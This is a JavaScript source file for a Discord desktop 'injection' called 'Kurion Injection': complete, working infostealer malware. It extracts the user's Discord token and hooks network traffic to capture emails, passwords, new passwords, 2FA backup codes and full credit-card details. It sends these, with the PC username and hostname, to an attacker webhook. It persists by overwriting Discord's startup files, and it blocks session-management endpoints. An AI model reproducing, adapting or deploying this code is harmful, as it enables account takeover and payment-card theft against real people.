const fs = require('fs');
const os = require('os');
const https = require('https');
const args = process.argv;
const path = require('path');
const querystring = require('querystring');

const {
    BrowserWindow,
    session,
} = require('electron');

const CONFIG = {
    webhook: "%WEBHOOK%",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://dis' + 'cord.com/api/v*/auth/sessions',
            'https://*.dis' + 'cord.com/api/v*/auth/sessions',
            'https://dis' + 'cordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    },
    API: "https://dis" + "cord.com/api/v9/users/@me",
    badges: {
        Discord_Emloyee: {
            Value: 1,
            Emoji: "<:8485discordemployee:1163172252989259898>",
            Rare: true,
        },
        Partnered_Server_Owner: {
            Value: 2,
            Emoji: "<:9928discordpartnerbadge:1163172304155586570>",
            Rare: true,
        },
        HypeSquad_Events: {
            Value: 4,
            Emoji: "<:9171hypesquadevents:1163172248140660839>",
            Rare: true,
        },
        Bug_Hunter_Level_1: {
            Value: 8,
            Emoji: "<:4744bughunterbadgediscord:1163172239970140383>",
            Rare: true,
        },
        Early_Supporter: {
            Value: 512,
            Emoji: "<:5053earlysupporter:1163172241996005416>",
            Rare: true,
        },
        Bug_Hunter_Level_2: {
            Value: 16384,
            Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>",
            Rare: true,
        },
        Early_Verified_Bot_Developer: {
            Value: 131072,
            Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>",
            Rare: true,
        },
        House_Bravery: {
            Value: 64,
            Emoji: "<:6601hypesquadbravery:1163172246492287017>",
            Rare: false,
        },
        House_Brilliance: {
            Value: 128,
            Emoji: "<:6936hypesquadbrilliance:1163172244474822746>",
            Rare: false,
        },
        House_Balance: {
            Value: 256,
            Emoji: "<:5242hypesquadbalance:1163172243417858128>",
            Rare: false,
        },
        Active_Developer: {
            Value: 4194304,
            Emoji: "<:1207iconactivedeveloper:1163172534443851868>",
            Rare: false,
        },
        Certified_Moderator: {
            Value: 262144,
            Emoji: "<:4149blurplecertifiedmoderator:1163172255489085481>",
            Rare: true,
        },
        Spammer: {
            Value: 1048704,
            Emoji: "⌨️",
            Rare: false,
        },
    },
};

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

const clearAllUserData = () => {
    executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
    executeJS("location.reload()");
};

const getToken = async () => await executeJS(`
    (() => {
        try {
            if (typeof webpackChunkdiscord_app === 'undefined') return "E: webpackChunkdiscord_app undefined";

            let modules = [];
            webpackChunkdiscord_app.push([
                [Math.random()],
                {},
                (e) => {
                    for (const key in e.c) {
                        modules.push(e.c[key]);
                    }
                }
            ]);

            if (modules.length < 50) {
                 for (let i = 0; i < webpackChunkdiscord_app.length; i++) {
                     const chunk = webpackChunkdiscord_app[i];
                     if (chunk && chunk.length > 1 && typeof chunk[1] === 'object') {
                         for (const key in chunk[1]) {

                         }
                     }
                 }
            }

            for (const m of modules) {
                try {
                    if (m?.exports?.default?.getToken) {
                        const token = m.exports.default.getToken();
                        if (typeof token === 'string' && token.length > 20) return token;
                    }
                    if (m?.exports?.getToken) {
                         const token = m.exports.getToken();
                        if (typeof token === 'string' && token.length > 20) return token;
                    }

                } catch (e) {

                }
            }

            try {
                const token = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token;
                 if (token && typeof token === 'string') {
                     return token.replace(/"/g, "");
                 }
            } catch(e) {}

            return "E: No valid token found in any module";
        } catch (err) {
            return "E: " + err.message;
        }
    })()
`);

const request = async (method, url, headers, data) => {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: method,
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
    };

    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];
    const req = https.request(options);
    if (data) req.write(data);
    req.end();

    return new Promise((resolve, reject) => {
        req.on("response", res => {
            log(`Response Status: ${res.statusCode}`);
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => {
                log(`Response Body: ${data.substring(0, 200)}`);
                resolve(data);
            });
        });
        req.on("error", err => {
            reject(err);
        });
        req.setTimeout(10000, () => {
            req.destroy();
            reject(new Error("Request timed out"));
        });
    });
};

const hooker = async (content, token, account) => {
    log("Entering hooker...");

    let osInfo = "";
    try {
        osInfo = "`" + os.userInfo().username + "` - `" + os.hostname() + "`";
    } catch (e) {
        log("OS Info failed: " + e.message);
        osInfo = "`Unknown User` - `Unknown Host`";
    }

    const originalMsg = content["content"];
    const finalContent =
        "# <:Release:1472464973304168458> Kurion Injection\n" +
        "> **User:** " + osInfo + " <:PIN:1472464227137622221>\n\n" +
        "## <:WARNING:1472464420452958219> " + originalMsg;

    content["content"] = finalContent;

    log("Getting Nitro/Badges...");
    const nitro = getNitro(account.premium_type);
    const badges = getBadges(account.flags);

    log("Getting Billing...");
    let billing = "`Error`";
    try {
        billing = await getBilling(token);
    } catch (e) { log("getBilling failed: " + e.message); }

    log("Getting Friends...");
    let friends = { message: "Error", totalFriends: 0 };
    try {
        friends = await getFriends(token);
    } catch (e) { log("getFriends failed: " + e.message); }

    log("Getting Servers...");
    let servers = { message: "Error", totalGuilds: 0 };
    try {
        servers = await getServers(token);
    } catch (e) { log("getServers failed: " + e.message); }

    if (!content["embeds"]) content["embeds"] = [{}];
    const mainEmbed = content["embeds"][0];

    mainEmbed["title"] = "Account Information";
    mainEmbed["color"] = 0xB7410E;

    mainEmbed["thumbnail"] = {
        "url": `https://cdn.disc` + `ordapp.com/avatars/${account.id}/${account.avatar}.webp`
    };

    mainEmbed["footer"] = {
        "text": "Kurion Injection",
        "icon_url": "https://avatars.githubusercontent.com/u/183814811?s=400&u=74267db42558312e8a98ef855c4c93816cb2beee&v=4",
    };

    let extraFields = [];
    if (mainEmbed["fields"]) {
        extraFields = mainEmbed["fields"];
    }

    mainEmbed["fields"] = [];
    for (let f of extraFields) {
        if ((f.name === "Email" || f.name === "Phone") && !f.value.startsWith("`")) {
            f.value = "`" + f.value + "`";
        }
        mainEmbed["fields"].push(f);
    }

    mainEmbed["fields"].push({
        "name": "Token",
        "value": "```" + token + "```",
        "inline": false
    });

    mainEmbed["fields"].push({
        "name": "Nitro",
        "value": nitro,
        "inline": true
    }, {
        "name": "Badges",
        "value": badges,
        "inline": true
    }, {
        "name": "Billing",
        "value": billing,
        "inline": true
    });

    let friendsValue = `${friends.totalFriends}`;
    if (friends.message.includes("No Rare Friends")) {
        friendsValue += " *(No rare friends)*";
    } else {
        friendsValue += `\n${friends.message}`;
    }

    let serversValue = `${servers.totalGuilds}`;
    if (servers.message.includes("No Rare Servers")) {
        serversValue += " *(No rare servers)*";
    } else {
        serversValue += `\n${servers.message}`;
    }

    mainEmbed["fields"].push({
        "name": "Total Friends",
        "value": friendsValue,
        "inline": false
    }, {
        "name": "Total Servers",
        "value": serversValue,
        "inline": false
    });

    content["embeds"] = [mainEmbed];

    log("Sending webhook request...");
    try {
        await request("POST", CONFIG.webhook, {
            "Content-Type": "application/json"
        }, JSON.stringify(content));
        log("Webhook sent successfully.");
    } catch (e) {
        log("Webhook request failed: " + e.message);
    }
};

const fetch = async (endpoint, headers) => {
    return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
};

const fetchAccount = async token => await fetch("", {
    "Authorization": token
});
const fetchBilling = async token => await fetch("/billing/payment-sources", {
    "Authorization": token
});
const fetchServers = async token => await fetch("/guilds?with_counts=true", {
    "Authorization": token
});
const fetchFriends = async token => await fetch("/relationships", {
    "Authorization": token
});

const getNitro = flags => {
    switch (flags) {
        case 1:
            return '`Nitro Classic`';
        case 2:
            return '`Nitro Boost`';
        case 3:
            return '`Nitro Basic`';
        default:
            return '`❌`';
    }
};

const getBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value) badges += b.Emoji + ' ';
    }
    return badges || '`❌`';
}

const getRareBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value && b.Rare) badges += b.Emoji + ' ';
    }
    return badges;
}

const getBilling = async token => {
    const data = await fetchBilling(token);
    let billing = '';
    data.forEach((x) => {
        if (!x.invalid) {
            switch (x.type) {
                case 1:
                    billing += '💳 ';
                    break;
                case 2:
                    billing += '<:paypal:1148653305376034967> ';
                    break;
            }
        }
    });
    return billing || '`❌`';
};

const getFriends = async token => {
    const friends = await fetchFriends(token);

    const filteredFriends = friends.filter((user) => {
        return user.type == 1
    })
    let rareUsers = "";
    for (const acc of filteredFriends) {
        var badges = getRareBadges(acc.user.public_flags)
        if (badges != "") {
            if (!rareUsers) rareUsers = "**Rare Friends:**\n";
            rareUsers += `${badges} ${acc.user.username}\n`;
        }
    }
    rareUsers = rareUsers || "**No Rare Friends**";

    return {
        message: rareUsers,
        totalFriends: friends.length,
    };
};

const getServers = async token => {
    const guilds = await fetchServers(token);

    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
    let rareGuilds = "";
    for (const guild of filteredGuilds) {
        if (rareGuilds === "") {
            rareGuilds += `**Rare Servers:**\n`;
        }
        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
    }

    rareGuilds = rareGuilds || "**No Rare Servers**";

    return {
        message: rareGuilds,
        totalGuilds: guilds.length,
    };
};

const EmailPassToken = async (email, password, token, action) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just ${action}!`,
        "embeds": [{
            "fields": [{
                "name": "Email",
                "value": "`" + email + "`",
                "inline": true
            }, {
                "name": "Password",
                "value": "`" + password + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const BackupCodesViewed = async (codes, token) => {
    const account = await fetchAccount(token)

    const filteredCodes = codes.filter((code) => {
        return code.consumed === false;
    });

    let message = "";
    for (let code of filteredCodes) {
        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
    }
    const content = {
        "content": `**${account.username}** just viewed his 2FA backup codes!`,
        "embeds": [{
            "fields": [{
                "name": "Backup Codes",
                "value": "```" + message + "```",
                "inline": false
            },
            {
                "name": "Email",
                "value": "`" + account.email + "`",
                "inline": true
            }, {
                "name": "Phone",
                "value": "`" + (account.phone || "None") + "`",
                "inline": true
            }
            ]

        }]
    };

    hooker(content, token, account);
}

const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just changed his password!`,
        "embeds": [{
            "fields": [{
                "name": "New Password",
                "value": "`" + newPassword + "`",
                "inline": true
            }, {
                "name": "Old Password",
                "value": "`" + oldPassword + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const CreditCardAdded = async (number, cvc, month, year, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just added a credit card!`,
        "embeds": [{
            "fields": [{
                "name": "Number",
                "value": "`" + number + "`",
                "inline": true
            }, {
                "name": "CVC",
                "value": "`" + cvc + "`",
                "inline": true
            }, {
                "name": "Expiration",
                "value": "`" + month + "/" + year + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const PaypalAdded = async (token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
        "embeds": [{
            "fields": [{
                "name": "Email",
                "value": "`" + account.email + "`",
                "inline": true
            }, {
                "name": "Phone",
                "value": "`" + (account.phone || "None") + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const discordPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;

    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }

    if (fs.existsSync(resourcePath)) return {
        resourcePath,
        app
    };
    return {
        undefined,
        undefined
    };
})();

const log = (msg) => {

};

async function initiation() {
    try {
        log("Initiation called");
        const initPath = path.join(__dirname, 'initiation');
        if (fs.existsSync(initPath)) {
            log("Initiation directory found at: " + initPath);

            let tokenResult;
            try {
                tokenResult = await getToken();
            } catch (e) {
                log("getToken threw error (likely not ready): " + e.message);
                return false;
            }

            if (!tokenResult || (typeof tokenResult === 'string' && tokenResult.startsWith("E: "))) {
                log("getToken failed: " + (tokenResult || "null/undefined"));
                return false;
            }

            const token = tokenResult;
            if (!token) {
                log("Token is empty/null");
                return false;
            }

            log("Token type: " + typeof token);
            try {
                if (typeof token !== 'string') {
                    log("Token is not string! Value: " + JSON.stringify(token));
                    return false;
                }
                log("Token acquired: " + token.substring(0, 10) + "...");
            } catch (err) {
                log("Error logging token: " + err.message);
            }

            fs.rmdirSync(initPath);
            log("Initiation directory removed");

            const account = await fetchAccount(token)
            log("Account fetched: " + account.username);

            const content = {
                "content": `**${account.username}** just got injected!`,

                "embeds": [{
                    "fields": [{
                        "name": "Email",
                        "value": "`" + account.email + "`",
                        "inline": true
                    }, {
                        "name": "Phone",
                        "value": "`" + (account.phone || "None") + "`",
                        "inline": true
                    }]
                }]
            };

            await hooker(content, token, account);
            clearAllUserData();
            return true;
        }

        const {
            resourcePath,
            app
        } = discordPath;
        if (resourcePath === undefined || app === undefined) return true;
        const appPath = path.join(resourcePath, 'app');
        const packageJson = path.join(appPath, 'package.json');
        const resourceIndex = path.join(appPath, 'index.js');
        const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
        const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
        const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
        if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
        if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
        if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

        if (process.platform === 'win32' || process.platform === 'darwin') {
            fs.writeFileSync(
                packageJson,
                JSON.stringify({
                    name: 'discord',
                    main: 'index.js',
                }, null, 4),
            );

            const payloadBackup = path.join(appPath, 'kurion.js');
            fs.copyFileSync(__filename, payloadBackup);

            const startUpScript = `const fs = require('fs');
    const indexJs = '${indexJs}';
    const bdPath = '${bdPath}';
    const payloadSrc = '${payloadBackup.replace(/\\/g, '\\\\')}';

    try {
        let shouldInfect = false;
        if (!fs.existsSync(indexJs)) {
            shouldInfect = true;
        } else {
            const currentSize = fs.statSync(indexJs).size;
            const targetSize = fs.statSync(payloadSrc).size;
            if (currentSize !== targetSize) {
                shouldInfect = true;
            }
        }

        if (shouldInfect) {
            fs.copyFileSync(payloadSrc, indexJs);
        }
    } catch (e) {
        try { fs.copyFileSync(payloadSrc, indexJs); } catch (err) {}
    }

    require('${path.join(resourcePath, 'app.asar').replace(/\\/g, '\\\\')}')
    if (fs.existsSync(bdPath)) require(bdPath);`;

            fs.writeFileSync(resourceIndex, startUpScript);
        }
        return true;

    } catch (err) {
        log("Initiation fatal error: " + err.stack);
        return false;
    }
}

let email = "";
let password = "";
let initiationCalled = false;
let lastInitiationAttempt = 0;
const createWindow = () => {
    mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return;

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!initiationCalled && Date.now() - lastInitiationAttempt > 5000) {
            lastInitiationAttempt = Date.now();
            initiationCalled = await initiation();
        }

        if (method !== 'Network.responseReceived') return;
        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
        if (![200, 202].includes(params.response.status)) return;

        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
            requestId: params.requestId
        });
        const responseData = JSON.parse(responseUnparsedData.body);

        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
            requestId: params.requestId
        });
        const requestData = JSON.parse(requestUnparsedData.postData);

        switch (true) {
            case params.response.url.endsWith('/login'):
                if (!responseData.token) {
                    email = requestData.login;
                    password = requestData.password;
                    return;
                }
                EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                break;

            case params.response.url.endsWith('/register'):
                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                break;

            case params.response.url.endsWith('/totp'):
                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                break;

            case params.response.url.endsWith('/codes-verification'):
                BackupCodesViewed(responseData.backup_codes, await getToken());
                break;

            case params.response.url.endsWith('/@me'):
                if (!requestData.password) return;

                if (requestData.email) {
                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
                }

                if (requestData.new_password) {
                    PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                }
                break;
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');

    mainWindow.on('closed', () => {
        createWindow()
    });
}

const pollingLoop = () => {
    const wins = BrowserWindow.getAllWindows();
    if (wins.length > 0) {
        createWindow();
    } else {
        setTimeout(pollingLoop, 500);
    }
};
pollingLoop();

session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != 'POST') return;
    switch (true) {
        case details.url.endsWith('tokens'):
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
            break;

        case details.url.endsWith('paypal_accounts'):
            PaypalAdded(await getToken());
            break;
    }
});

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
        cancel: true
    })
});

module.exports = require("./core.asar");
